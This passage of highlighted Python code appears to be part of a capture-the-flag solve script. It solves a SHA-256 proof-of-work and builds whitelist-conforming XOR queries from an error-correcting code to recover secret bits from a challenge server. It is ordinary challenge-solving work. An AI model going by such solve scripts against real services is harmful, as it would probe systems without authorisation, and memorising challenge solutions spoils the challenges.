</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">end</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">+=</span> <span class="n">recv_all</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">marker</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_line</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">((</span><span class="n">s</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------- POW ----------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_pow</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;sha256\(\s*XXXX\s*\+\s*([^\)\s]+)\s*\)\s*==\s*([0-9a-fA-F]{64,})&#34;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{}</span><span class="s2">&#34;</span><span class="p">),</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brute_prefix</span><span class="p">(</span><span class="n">suffix</span><span class="p">,</span> <span class="n">target_hex</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sfx</span> <span class="o">=</span> <span class="n">suffix</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># randomized attempts first</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">200000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cand</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">ALPHABET</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">cand</span> <span class="o">+</span> <span class="n">sfx</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">target_hex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">cand</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># deterministic fallback</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">ALPHABET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">ALPHABET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">ALPHABET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">ALPHABET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">cand</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">d</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">cand</span> <span class="o">+</span> <span class="n">sfx</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">target_hex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">cand</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------- build XOR expression (white-list-safe) ----------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fmt_token</span><span class="p">(</span><span class="n">tok</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># tokens like &#34;( S0 == 1 )&#34; already spacing-safe; we ensure spacing around parens and == later</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">tok</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor2_expr</span><span class="p">(</span><span class="n">a_expr</span><span class="p">,</span> <span class="n">b_expr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># XOR(a,b) = (a and not b) or (not a and b)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># but &#39;not&#39; isn&#39;t in whitelist; use (a==1 and b==0) or (a==0 and b==1)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;( ( &#34;</span> <span class="o">+</span> <span class="n">a_expr</span> <span class="o">+</span> <span class="s2">&#34; and &#34;</span> <span class="o">+</span> <span class="s2">&#34;( &#34;</span> <span class="o">+</span> <span class="n">b_expr</span> <span class="o">+</span> <span class="s2">&#34; ) == 0 ) or ( ( &#34;</span> <span class="o">+</span> <span class="n">a_expr</span> <span class="o">+</span> <span class="s2">&#34; ) == 0 and &#34;</span> <span class="o">+</span> <span class="n">b_expr</span> <span class="o">+</span> <span class="s2">&#34; ) )&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_xor_expr</span><span class="p">(</span><span class="n">indices</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    indices: list of bit indices [0..7] to XOR together
</span></span></span><span class="line"><span class="cl"><span class="s2">    returns string expression using allowed tokens
</span></span></span><span class="line"><span class="cl"><span class="s2">    implement by folding pairwise XOR
</span></span></span><span class="line"><span class="cl"><span class="s2">    base var expression for bit i: ( S</span><span class="si">{i}</span><span class="s2"> == 1 )
</span></span></span><span class="line"><span class="cl"><span class="s2">    For a single index, return &#34;( S</span><span class="si">{i}</span><span class="s2"> == 1 )&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">indices</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">var</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;( S</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> == 1 )&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">exprs</span> <span class="o">=</span> <span class="p">[</span><span class="n">var</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">indices</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># fold using xor2_expr</span>
</span></span><span class="line"><span class="cl">    <span class="n">cur</span> <span class="o">=</span> <span class="n">exprs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">exprs</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># xor2_expr expects boolean-like strings; but it uses &#34;== 0&#34; comparisons</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># ensure inside expressions are parenthesized</span>
</span></span><span class="line"><span class="cl">        <span class="n">cur</span> <span class="o">=</span> <span class="s2">&#34;( ( &#34;</span> <span class="o">+</span> <span class="n">cur</span> <span class="o">+</span> <span class="s2">&#34; and ( &#34;</span> <span class="o">+</span> <span class="n">e</span> <span class="o">+</span> <span class="s2">&#34; ) == 0 ) or ( ( &#34;</span> <span class="o">+</span> <span class="n">cur</span> <span class="o">+</span> <span class="s2">&#34; ) == 0 and &#34;</span> <span class="o">+</span> <span class="n">e</span> <span class="o">+</span> <span class="s2">&#34; ) )&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># clean up double spaces</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;\s+&#34;</span><span class="p">,</span> <span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="n">cur</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------- search for good generator matrix G (8 x 17) ----------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">weight</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">sum</span><span class="p">(</span><span class="mi">1</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">v</span> <span class="k">if</span> <span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">code_min_distance</span><span class="p">(</span><span class="n">G_cols</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># G_cols: list of 17 column vectors each length 8 bits (0/1)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># compute all codewords s*G (mod 2) for s in 1..255 and return minimum weight</span>
</span></span><span class="line"><span class="cl">    <span class="n">minw</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># For speed, precompute columns as ints bitpacked</span>
</span></span><span class="line"><span class="cl">    <span class="n">col_ints</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">col</span> <span class="ow">in</span> <span class="n">G_cols</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">b</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">val</span> <span class="o">|=</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">col_ints</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># enumerate nonzero s in 1..255</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># compute codeword bits across 17 columns: bit j = parity(popcount(col_ints[j] &amp; s))</span>
</span></span><span class="line"><span class="cl">        <span class="n">cw_weight</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">col_ints</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">bits</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">c</span> <span class="o">&amp;</span> <span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">b</span> <span class="o">=</span> <span class="n">bits</span> <span class="o">&amp;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="n">cw_weight</span> <span class="o">+=</span> <span class="n">b</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># early cutoff</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">minw</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">cw_weight</span> <span class="o">&gt;=</span> <span class="n">minw</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">cw_weight</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">minw</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">cw_weight</span> <span class="o">&lt;</span> <span class="n">minw</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">minw</span> <span class="o">=</span> <span class="n">cw_weight</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">minw</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">minw</span> <span class="k">if</span> <span class="n">minw</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="k">else</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_good_G</span><span class="p">(</span><span class="n">max_tries</span><span class="o">=</span><span class="mi">20000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># return G_cols: list of 17 columns each a list of 8 bits (0/1), with min distance &gt;=5</span>
</span></span><span class="line"><span class="cl">    <span class="n">tries</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">tries</span> <span class="o">&lt;</span> <span class="n">max_tries</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">tries</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># generate random full-rank generator matrix: 8x17 (we create 17 columns length 8)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># ensure rank 8 by ensuring first 8 columns form invertible matrix - simpler: construct by starting with identity cols then add random</span>
</span></span><span class="line"><span class="cl">        <span class="n">cols</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># put identity columns first</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">col</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl">            <span class="n">col</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="n">cols</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">col</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># remaining 9 random nonzero columns</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">col</span> <span class="o">=</span> <span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">])</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># avoid all zero column</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">sum</span><span class="p">(</span><span class="n">col</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">col</span><span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">8</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="n">cols</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">col</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># compute min distance</span>
</span></span><span class="line"><span class="cl">        <span class="n">dmin</span> <span class="o">=</span> <span class="n">code_min_distance</span><span class="p">(</span><span class="n">cols</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">dmin</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Found G with dmin=</span><span class="si">{</span><span class="n">dmin</span><span class="si">}</span><span class="s2"> after </span><span class="si">{</span><span class="n">tries</span><span class="si">}</span><span class="s2"> tries&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">cols</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># else shuffle and try small mutation occasionally</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tries</span> <span class="o">%</span> <span class="mi">500</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;failed to find good G in given tries&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------- build queries from G ----------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_queries_from_G</span><span class="p">(</span><span class="n">G_cols</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># For each column (list of 8 bits) produce XOR expression of indices where bit==1</span>
</span></span><span class="line"><span class="cl">    <span class="n">queries</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">col</span> <span class="ow">in</span> <span class="n">G_cols</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">inds</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">col</span><span class="p">)</span> <span class="k">if</span> <span class="n">b</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">inds</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># column zero shouldn&#39;t happen; use constant 0 expression</span>
</span></span><span class="line"><span class="cl">            <span class="n">q</span> <span class="o">=</span> <span class="s2">&#34;( 0 == 1 )&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">inds</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">q</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;( S</span><span class="si">{</span><span class="n">inds</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> == 1 )&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">q</span> <span class="o">=</span> <span class="n">build_xor_expr</span><span class="p">(</span><span class="n">inds</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># normalize spaces to avoid smirk</span>
</span></span><span class="line"><span class="cl">        <span class="n">q</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;\s+&#34;</span><span class="p">,</span> <span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">queries</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">queries</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------- helper to encode secret by G ----------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode_by_G</span><span class="p">(</span><span class="n">s_tuple</span><span class="p">,</span> <span class="n">G_cols</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># s_tuple length 8 of 0/1 ints</span>
</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">col</span> <span class="ow">in</span> <span class="n">G_cols</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># parity of dot product s . col</span>
</span></span><span class="line"><span class="cl">        <span class="n">v</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">s_tuple</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="n">col</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">code</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">bool</span><span class="p">(</span><span class="n">v</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">code</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------- main interaction using coded queries ----------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run_coded</span><span class="p">(</span><span class="n">attempts_find_G</span><span class="o">=</span><span class="mi">5000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">()</span>  <span class="c1"># unpredictable per run</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Searching for good generator matrix G (this runs locally)...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">G_cols</span> <span class="o">=</span> <span class="n">find_good_G</span><span class="p">(</span><span class="n">max_tries</span><span class="o">=</span><span class="n">attempts_find_G</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">queries</span> <span class="o">=</span> <span class="n">build_queries_from_G</span><span class="p">(</span><span class="n">G_cols</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Using generated queries (17):&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">q</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">queries</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="s2">02d</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">q</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># now network interaction (POW -&gt; send queries -&gt; decode -&gt; submit) - follows same interaction style</span>
</span></span><span class="line"><span class="cl">    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">1.0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">banner</span> <span class="o">=</span> <span class="n">recv_until</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;Give me XXXX:&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;sha256&#34;</span> <span class="ow">in</span> <span class="n">banner</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">suffix</span><span class="p">,</span> <span class="n">hexd</span> <span class="o">=</span> <span class="n">parse_pow</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">suffix</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">hexd</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">banner</span> <span class="o">+=</span> <span class="n">recv_all</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">suffix</span><span class="p">,</span> <span class="n">hexd</span> <span class="o">=</span> <span class="n">parse_pow</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">suffix</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">hexd</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] cannot parse POW&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;Give me&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">banner</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">banner</span> <span class="o">+=</span> <span class="n">recv_until</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s2">&#34;Give me XXXX:&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] POW suffix:&#34;</span><span class="p">,</span> <span class="n">suffix</span><span class="p">,</span> <span class="s2">&#34;target:&#34;</span><span class="p">,</span> <span class="n">hexd</span><span class="p">)</span>
